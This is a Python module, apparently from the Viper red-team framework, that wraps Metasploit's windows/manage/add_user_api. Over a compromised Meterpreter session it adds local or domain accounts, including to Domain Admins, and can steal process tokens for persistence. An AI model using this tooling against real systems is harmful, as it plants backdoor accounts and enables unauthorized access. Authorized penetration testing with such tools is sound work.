# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "Windows 增加本地账户/域账户"
    DESC = "通过Windows api增加本地用户/域用户.\n" \
           "可以选择steal_token功能窃取本地进程权限来执行创建用户操作."
    MODULETYPE = TAG2CH.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1004"]  # ATTCK向量
    AUTHOR = "Viper"
    README = ["https://www.yuque.com/vipersec/module/bf54r3"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1098/"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionStr(name='USERNAME', name_tag="用户名", desc="账户的用户名,域用户无需填写域名", required=True),
        OptionStr(name='PASSWORD', name_tag="密码", desc="账户的密码,建议使用满足一定复杂度的密码", required=True),
        OptionStr(name='GROUP', name_tag="用户组", desc="本地用户组: Users"
                                                     "本地管理员组: Administrators"
                                                     "域管理员组: Domain Admins"
                                                     "域用户组:Domain Users", required=True),
        OptionBool(name="ADDTODOMAIN",
                   name_tag="域用户",
                   required=True,
                   default=False,
                   desc="选定则添加为域账户,未选定则添加为本地账户"),
        OptionStr(name='TOKEN', name_tag="用户TOKEN", desc="添加域用户时可将TOKEN设置为用户名或PID,模块会自动使用steal_token窃取token."),
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "post"
        self.mname = "windows/manage/add_user_api"

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Meterpreter类型的Session"

        self.set_option("ADDTODOMAIN", self.param("ADDTODOMAIN"))
        self.set_option("USERNAME", self.param("USERNAME"))
        self.set_option("PASSWORD", self.param("PASSWORD"))
        self.set_option("GROUP", self.param("GROUP"))
        self.set_option("TOKEN", self.param("TOKEN"))

        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_good("模块执行成功")
            self.log_good("详细日志请查看右侧日志栏")
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
